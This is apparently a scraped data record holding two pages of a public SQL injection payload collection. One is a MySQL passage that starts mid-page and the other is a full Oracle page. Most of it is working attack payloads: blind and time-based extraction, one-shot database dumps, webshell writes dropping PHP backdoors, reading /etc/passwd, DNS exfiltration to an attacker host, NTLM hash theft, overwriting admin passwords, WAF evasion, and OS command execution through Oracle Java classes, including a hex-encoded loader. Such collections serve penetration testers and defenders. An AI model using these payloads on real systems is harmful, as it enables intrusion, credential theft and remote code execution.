DATABASE() LIKE 'SA___')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#\n```\n\nExtracting the third character.\n\n```sql\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#\n```\n\nExtracting column_name.\n\n```sql\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#\n```\n\n### Using Conditional Statements\n\n```sql\n?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --\n?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --\n?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2\n```\n\n## MYSQL DIOS - Dump in One Shot\n\nDIOS (Dump In One Shot) SQL Injection is an advanced technique that allows an attacker to extract entire database contents in a single, well-crafted SQL injection payload. This method leverages the ability to concatenate multiple pieces of data into a single result set, which is then returned in one response from the database.\n\n```sql\n(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#\n(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#\n```\n\n* SecurityIdiots\n\n    ```sql\n    make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)\n    ```\n\n* Profexer\n\n    ```sql\n    (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)\n    ```\n\n* Dr.Z3r0\n\n    ```sql\n    (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))\n    ```\n\n* M@dBl00d\n\n    ```sql\n    (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))\n    ```\n\n* Zen\n\n    ```sql\n    +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)\n    ```\n\n* sharik\n\n    ```sql\n    (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)\n    ```\n\n## MYSQL Current Queries\n\n`INFORMATION_SCHEMA.PROCESSLIST` is a special table available in MySQL and MariaDB that provides information about active processes and threads within the database server. This table can list all operations that DB is performing at the moment.\n\nThe `PROCESSLIST` table contains several important columns, each providing details about the current processes. Common columns include:\n\n* **ID** : The process identifier.\n* **USER** : The MySQL user who is running the process.\n* **HOST** : The host from which the process was initiated.\n* **DB** : The database the process is currently accessing, if any.\n* **COMMAND** : The type of command the process is executing (e.g., Query, Sleep).\n* **TIME** : The time in seconds that the process has been running.\n* **STATE** : The current state of the process.\n* **INFO** : The text of the statement being executed, or NULL if no statement is being executed.\n\n```sql\nSELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;\n```\n\n| ID  | USER      | HOST           | DB     | COMMAND | TIME | STATE      | INFO |\n| --- | --------- | ---------------- | ------- | ------- | ---- | ---------- | ---- |\n| 1   | root   | localhost        | testdb  | Query  | 10 | executing  | SELECT * FROM some_table |\n| 2   | app_uset  | 192.168.0.101    | appdb   | Sleep  | 300 | sleeping  | NULL |\n| 3   | gues_user | example.com:3360 | NULL    | Connect | 0    | connecting | NULL |\n\n```sql\nUNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #\n```\n\nDump in one shot query to extract the whole content of the table.\n\n```sql\nUNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #\n```\n\n## MYSQL Read Content of a File\n\nNeed the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`\n\n```sql\nUNION ALL SELECT LOAD_FILE('/etc/passwd') --\nUNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));\n```\n\nIf you are `root` on the database, you can re-enable the `LOAD_FILE` using the following query\n\n```sql\nGRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#\n```\n\n## MYSQL Command Execution\n\n### WEBSHELL - OUTFILE Method\n\n```sql\n[...] UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"\n[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'\n[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- -\n[...] union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'\n```\n\n### WEBSHELL - DUMPFILE Method\n\n```sql\n[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'\n[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';\n```\n\n### COMMAND - UDF Library\n\nFirst you need to check if the UDF are installed on the server.\n\n```powershell\n$ whereis lib_mysqludf_sys.so\n/usr/lib/lib_mysqludf_sys.so\n```\n\nThen you can use functions such as `sys_exec` and `sys_eval`.\n\n```sql\n$ mysql -u root -p mysql\nEnter password: [...]\n\nmysql> SELECT sys_eval('id');\n+--------------------------------------------------+\n| sys_eval('id') |\n+--------------------------------------------------+\n| uid=118(mysql) gid=128(mysql) groups=128(mysql) |\n+--------------------------------------------------+\n```\n\n## MYSQL INSERT\n\n`ON DUPLICATE KEY UPDATE` keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:\n\nInject using payload:\n\n```sql\nattacker_dummy@example.com\", \"P@ssw0rd\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" --\n```\n\nThe query would look like this:\n\n```sql\nINSERT INTO users (email, password) VALUES (\"attacker_dummy@example.com\", \"BCRYPT_HASH\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" -- \", \"BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT\");\n```\n\nThis query will insert a row for the user \"`attacker_dummy@example.com`\". It will also insert a row for the user \"`admin@example.com`\".\n\nBecause this row already exists, the `ON DUPLICATE KEY UPDATE` keyword tells MySQL to update the `password` column of the already existing row to \"P@ssw0rd\". After this, we can simply authenticate with \"`admin@example.com`\" and the password \"P@ssw0rd\".\n\n## MYSQL Truncation\n\nIn MYSQL \"`admin`\" and \"`admin`\" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.\n\n```sql\n`username` varchar(20) not null\n```\n\nPayload: `username = \"admin               a\"`\n\n## MYSQL Out of Band\n\n```powershell\nSELECT @@version INTO OUTFILE '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt';\nSELECT @@version INTO DUMPFILE '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt;\n```\n\n### DNS Exfiltration\n\n```sql\nSELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.hacker.site\\\\a.txt'));\nSELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))\n```\n\n### UNC Path - NTLM Hash Stealing\n\nThe term \"UNC path\" refers to the Universal Naming Convention path used to specify the location of resources such as shared files or devices on a network. It is commonly used in Windows environments to access files over a network using a format like `\\\\server\\share\\file`.\n\n```sql\nSELECT LOAD_FILE('\\\\\\\\error\\\\abc');\nSELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);\nSELECT '' INTO DUMPFILE '\\\\\\\\error\\\\abc';\nSELECT '' INTO OUTFILE '\\\\\\\\error\\\\abc';\nLOAD DATA INFILE '\\\\\\\\error\\\\abc' INTO TABLE DATABASE.TABLE_NAME;\n```\n\n:warning: Don't forget to escape the '\\\\\\\\'.\n\n## MYSQL WAF Bypass\n\n### Alternative to Information Schema\n\n`information_schema.tables` alternative\n\n```sql\nSELECT * FROM mysql.innodb_table_stats;\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |\n| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |\n...\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n\nmysql> SHOW TABLES IN dvwa;\n+----------------+\n| Tables_in_dvwa |\n+----------------+\n| guestbook      |\n| users          |\n+----------------+\n```\n\n### Alternative to VERSION\n\n```sql\nmysql> SELECT @@innodb_version;\n+------------------+\n| @@innodb_version |\n+------------------+\n| 5.6.31           |\n+------------------+\n\nmysql> SELECT @@version;\n+-------------------------+\n| @@version               |\n+-------------------------+\n| 5.6.31-0ubuntu0.15.10.1 |\n+-------------------------+\n\nmysql> SELECT version();\n+-------------------------+\n| version()               |\n+-------------------------+\n| 5.6.31-0ubuntu0.15.10.1 |\n+-------------------------+\n\nmysql> SELECT @@GLOBAL.VERSION;\n+------------------+\n| @@GLOBAL.VERSION |\n+------------------+\n| 8.0.27           |\n+------------------+\n```\n\n### Alternative to GROUP_CONCAT\n\nRequirement: `MySQL >= 5.7.22`\n\nUse `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed\n\n* `group_concat()` = 1024 symbols\n* `json_arrayagg()` > 16,000,000 symbols\n\n```sql\nSELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;\n```\n\n### Scientific Notation\n\nIn MySQL, the e notation is used to represent numbers in scientific notation. It's a way to express very large or very small numbers in a concise format. The e notation consists of a number followed by the letter e and an exponent.\nThe format is: `base 'e' exponent`.\n\nFor example:\n\n* `1e3` represents `1 x 10^3` which is `1000`.\n* `1.5e3` represents `1.5 x 10^3` which is `1500`.\n* `2e-3` represents `2 x 10^-3` which is `0.002`.\n\nThe following queries are equivalent:\n\n* `SELECT table_name FROM information_schema 1.e.tables`\n* `SELECT table_name FROM information_schema .tables`\n\nIn the same way, the common payload to bypass authentication `' or ''='` is equivalent to `' or 1.e('')='` and `1' or 1.e(1) or '1'='1`.\nThis technique can be used to obfuscate queries to bypass WAF, for example: `1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2`\n\n### Conditional Comments\n\nMySQL conditional comments are enclosed within `/*! ... */` and can include a version number to specify the minimum version of MySQL that should execute the contained code.\nThe code inside this comment will be executed only if the MySQL version is greater than or equal to the number immediately following the `/*!`. If the MySQL version is less than the specified number, the code inside the comment will be ignored.\n\n* `/*!12345UNION*/`: This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher.\n* `/*!31337SELECT*/`: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher.\n\n**Examples**: `/*!12345UNION*/`, `/*!31337SELECT*/`\n\n### Wide Byte Injection (GBK)\n\nWide byte injection is a specific type of SQL injection attack that targets applications using multi-byte character sets, like GBK or SJIS. The term \"wide byte\" refers to character encodings where one character can be represented by more than one byte. This type of injection is particularly relevant when the application and the database interpret multi-byte sequences differently.\n\nThe `SET NAMES gbk` query can be exploited in a charset-based SQL injection attack. When the character set is set to GBK, certain multibyte characters can be used to bypass the escaping mechanism and inject malicious SQL code.\n\nSeveral characters can be used to trigger the injection.\n\n* `%bf%27`: This is a URL-encoded representation of the byte sequence `0xbf27`. In the GBK character set, `0xbf27` decodes to a valid multibyte character followed by a single quote ('). When MySQL encounters this sequence, it interprets it as a single valid GBK character followed by a single quote, effectively ending the string.\n* `%bf%5c`: Represents the byte sequence `0xbf5c`. In GBK, this decodes to a valid multi-byte character followed by a backslash (`\\`). This can be used to escape the next character in the sequence.\n* `%a1%27`: Represents the byte sequence `0xa127`. In GBK, this decodes to a valid multi-byte character followed by a single quote (`'`).\n\nA lot of payloads can be created such as:\n\n```sql\n%A8%27 OR 1=1;--\n%8C%A8%27 OR 1=1--\n%bf' OR 1=1 -- --\n```\n\nHere is a PHP example using GBK encoding and filtering the user input to escape backslash, single and double quote.\n\n```php\nfunction check_addslashes($string)\n{\n    $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);          //escape any backslash\n    $string = preg_replace('/\\'/i', '\\\\\\'', $string);                               //escape single quote with a backslash\n    $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);                                //escape double quote with a backslash\n      \n    return $string;\n}\n\n$id=check_addslashes($_GET['id']);\nmysql_query(\"SET NAMES gbk\");\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\nprint_r(mysql_error());\n```\n\nHere's a breakdown of how the wide byte injection works:\n\nFor instance, if the input is `?id=1'`, PHP will add a backslash, resulting in the SQL query: `SELECT * FROM users WHERE id='1\\'' LIMIT 0,1`.\n\nHowever, when the sequence `%df` is introduced before the single quote, as in `?id=1%df'`, PHP still adds the backslash. This results in the SQL query: `SELECT * FROM users WHERE id='1%df\\'' LIMIT 0,1`.\n\nIn the GBK character set, the sequence `%df%5c` translates to the character `連`. So, the SQL query becomes: `SELECT * FROM users WHERE id='1連'' LIMIT 0,1`. Here, the wide byte character `連` effectively \"eating\" the added escape character, allowing for SQL injection.\n\nTherefore, by using the payload `?id=1%df' and 1=1 --+`, after PHP adds the backslash, the SQL query transforms into: `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`. This altered query can be successfully injected, bypassing the intended SQL logic.\n\n## References\n\n* [[SQLi] Extracting data without knowing columns names - Ahmed Sultan - February 9, 2019](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)\n* [A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection - Marc Olivier Bergeron - October 19, 2021](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)\n* [Alternative for Information_Schema.Tables in MySQL - Osanda Malith Jayathissa - February 3, 2017](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)\n* [Ekoparty CTF 2016 (Web 100) - p4-team - October 26, 2016](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)\n* [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://sqlwiki.netspi.com/injectionTypes/errorBased)\n* [How to Use SQL Calls to Secure Your Web Site - IPA ISEC - March 2010](https://www.ipa.go.jp/security/vuln/ps6vr70000011hc4-att/000017321.pdf)\n* [MySQL Out of Band Hacking - Osanda Malith Jayathissa - February 23, 2018](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)\n* [SQL injection - The oldschool way - 02 - Ahmed Sultan - January 1, 2025](https://www.youtube.com/watch?v=u91EdO1cDak)\n* [SQL Truncation Attack - Rohit Shaw - June 29, 2014](https://resources.infosecinstitute.com/sql-truncation-attack/)\n* [SQLi filter evasion cheat sheet (MySQL) - Johannes Dahse - December 4, 2010](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)\n* [The SQL Injection Knowledge Base - Roberto Salgado - May 29, 2013](https://websec.ca/kb/sql_injection#MySQL_Default_Databases)\n", "timestamp": "2025-10-21T13:30:18.095738"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "SQL Injection/OracleSQL Injection.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md", "content": "# Oracle SQL Injection\n\n> Oracle SQL Injection  is a type of security vulnerability that arises when attackers can insert or \"inject\" malicious SQL code into SQL queries executed by Oracle Database. This can occur when user inputs are not properly sanitized or parameterized, allowing attackers to manipulate the query logic. This can lead to unauthorized access, data manipulation, and other severe security implications.\n\n## Summary\n\n* [Oracle SQL Default Databases](#oracle-sql-default-databases)\n* [Oracle SQL Comments](#oracle-sql-comments)\n* [Oracle SQL Enumeration](#oracle-sql-enumeration)\n* [Oracle SQL Database Credentials](#oracle-sql-database-credentials)\n* [Oracle SQL Methodology](#oracle-sql-methodology)\n    * [Oracle SQL List Databases](#oracle-sql-list-databases)\n    * [Oracle SQL List Tables](#oracle-sql-list-tables)\n    * [Oracle SQL List Columns](#oracle-sql-list-columns)\n* [Oracle SQL Error Based](#oracle-sql-error-based)\n* [Oracle SQL Blind](#oracle-sql-blind)\n    * [Oracle Blind With Substring Equivalent](#oracle-blind-with-substring-equivalent)\n* [Oracle SQL Time Based](#oracle-sql-time-based)\n* [Oracle SQL Out of Band](#oracle-sql-out-of-band)\n* [Oracle SQL Command Execution](#oracle-sql-command-execution)\n    * [Oracle Java Execution](#oracle-java-execution)\n    * [Oracle Java Class](#oracle-java-class)\n* [OracleSQL File Manipulation](#oraclesql-file-manipulation)\n    * [OracleSQL Read File](#oraclesql-read-file)\n    * [OracleSQL Write File](#oraclesql-write-file)\n    * [Package os_command](#package-os_command)\n    * [DBMS_SCHEDULER Jobs](#dbms_scheduler-jobs)\n* [References](#references)\n\n## Oracle SQL Default Databases\n\n| Name               | Description               |\n|--------------------|---------------------------|\n| SYSTEM             | Available in all versions |\n| SYSAUX             | Available in all versions |\n\n## Oracle SQL Comments\n\n| Type                | Comment |\n| ------------------- | ------- |\n| Single-Line Comment | `--`    |\n| Multi-Line Comment  | `/**/`  |\n\n## Oracle SQL Enumeration\n\n| Description   | SQL Query |\n| ------------- | ------------------------------------------------------------ |\n| DBMS version  | `SELECT user FROM dual UNION SELECT * FROM v$version`        |\n| DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';`  |\n| DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'TNS%';`     |\n| DBMS version  | `SELECT BANNER FROM gv$version WHERE ROWNUM = 1;`            |\n| DBMS version  | `SELECT version FROM v$instance;`                            |\n| Hostname      | `SELECT UTL_INADDR.get_host_name FROM dual;`                 |\n| Hostname      | `SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;`     |\n| Hostname      | `SELECT UTL_INADDR.get_host_address FROM dual;`              |\n| Hostname      | `SELECT host_name FROM v$instance;`                          |\n| Database name | `SELECT global_name FROM global_name;`                       |\n| Database name | `SELECT name FROM V$DATABASE;`                               |\n| Database name | `SELECT instance_name FROM V$INSTANCE;`                      |\n| Database name | `SELECT SYS.DATABASE_NAME FROM DUAL;`                        |\n| Database name | `SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;` |\n\n## Oracle SQL Database Credentials\n\n| Query                                   | Description               |\n|-----------------------------------------|---------------------------|\n| `SELECT username FROM all_users;`       | Available on all versions |\n| `SELECT name, password from sys.user$;` | Privileged, <= 10g        |\n| `SELECT name, spare4 from sys.user$;`   | Privileged, <= 11g        |\n\n## Oracle SQL Methodology\n\n### Oracle SQL List Databases\n\n```sql\nSELECT DISTINCT owner FROM all_tables;\nSELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)\n```\n\n### Oracle SQL List Tables\n\n```sql\nSELECT table_name FROM all_tables;\nSELECT owner, table_name FROM all_tables;\nSELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';\nSELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'\n```\n\n### Oracle SQL List Columns\n\n```sql\nSELECT column_name FROM all_tab_columns WHERE table_name = 'blah';\nSELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'\n```\n\n## Oracle SQL Error Based\n\n| Description           | Query          |\n| :-------------------- | :------------- |\n| Invalid HTTP Request  | `SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual` |\n| CTXSYS.DRITHSX.SN     | `SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual` |\n| Invalid XPath         | `SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual` |\n| Invalid XML           | `SELECT to_char(dbms_xmlgen.getxml('select \"'&#124;&#124;(select user from sys.dual)&#124;&#124;'\" FROM sys.dual')) FROM dual` |\n| Invalid XML           | `SELECT rtrim(extract(xmlagg(xmlelement(\"s\", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users` |\n| SQL Error             | `SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))` |\n| XDBURITYPE getblob    | `XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()` |\n| XDBURITYPE getclob    | `XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()` |\n| XMLType               | `AND 1337=(SELECT UPPER(XMLType(CHR(60)\\|\\|CHR(58)\\|\\|'~'\\|\\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\\|\\|'~'\\|\\|CHR(62))) FROM DUAL) -- -` |\n| DBMS_UTILITY          | `AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\\|\\|(SELECT banner FROM v$version)\\|\\|'~') -- -` |\n\nWhen the injection point is inside a string use : `'||PAYLOAD--`\n\n## Oracle SQL Blind\n\n| Description              | Query          |\n| :----------------------- | :------------- |\n| Version is 12.2        | `SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';` |\n| Subselect is enabled    | `SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)` |\n| Table log_table exists   | `SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);` |\n| Column message exists in table log_table | `SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';` |\n| First letter of first message is t | `SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';` |\n\n### Oracle Blind With Substring Equivalent\n\n| Function    | Example                                   |\n| ----------- | ----------------------------------------- |\n| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |\n\n## Oracle SQL Time Based\n\n```sql\nAND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) \nAND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)\n```\n\n## Oracle SQL Out of Band\n\n```sql\nSELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual\n```\n\n## Oracle SQL Command Execution\n\n* [quentinhardy/odat](https://github.com/quentinhardy/odat) - ODAT (Oracle Database Attacking Tool)\n\n### Oracle Java Execution\n\n* List Java privileges\n\n    ```sql\n    select * from dba_java_policy\n    select * from user_java_policy\n    ```\n\n* Grant privileges\n\n    ```sql\n    exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');\n    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');\n    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');\n    ```\n\n* Execute commands\n    * 10g R2, 11g R1 and R2: `DBMS_JAVA_TEST.FUNCALL()`\n\n        ```sql\n        SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\\\windows\\\\system32\\\\cmd.exe','/c', 'dir >c:\\test.txt') FROM DUAL\n        SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual\n        ```\n\n    * 11g R1 and R2: `DBMS_JAVA.RUNJAVA()`\n\n        ```sql\n        SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL\n        ```\n\n### Oracle Java Class\n\n* Create Java class\n\n    ```sql\n    BEGIN\n    EXECUTE IMMEDIATE 'create or replace and compile java source named \"PwnUtil\" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';\n    END;\n\n    BEGIN\n    EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';\n    END;\n\n    -- hex encoded payload\n    SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));\n    EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual\n    ```\n\n* Run OS command\n\n    ```sql\n    SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;\n    ```\n\n### Package os_command\n\n```sql\nSELECT os_command.exec_clob('<COMMAND>') cmd from dual\n```\n\n### DBMS_SCHEDULER Jobs\n\n```sql\nDBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)\n```\n\n## OracleSQL File Manipulation\n\n:warning: Only in a stacked query.\n\n### OracleSQL Read File\n\n```sql\nutl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)\n```\n\n### OracleSQL Write File\n\n```sql\nutl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)\n```\n\n## References\n\n* [ASDC12 - New and Improved Hacking Oracle From Web - Sumit “sid” Siddharth - November 8, 2021](https://web.archive.org/web/20211108150011/https://owasp.org/www-pdf-archive/ASDC12-New_and_Improved_Hacking_Oracle_From_Web.pdf)\n* [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)\n* [ODAT: Oracle Database Attacking Tool - quentinhardy - March 24, 2016](https://github.com/quentinhardy/odat/wiki/privesc)\n* [Oracle SQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)\n* [Pentesting Oracle TNS Listener - HackTricks - July 19, 2024](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)\n* [The SQL Injection Knowledge Base - Roberto Salgado - May 29, 2013](https://www.websec.ca/kb/sql_injection#Oracle_Default_Databases)\n", "timestamp": "2025-10-21T13:30:18.210668"}
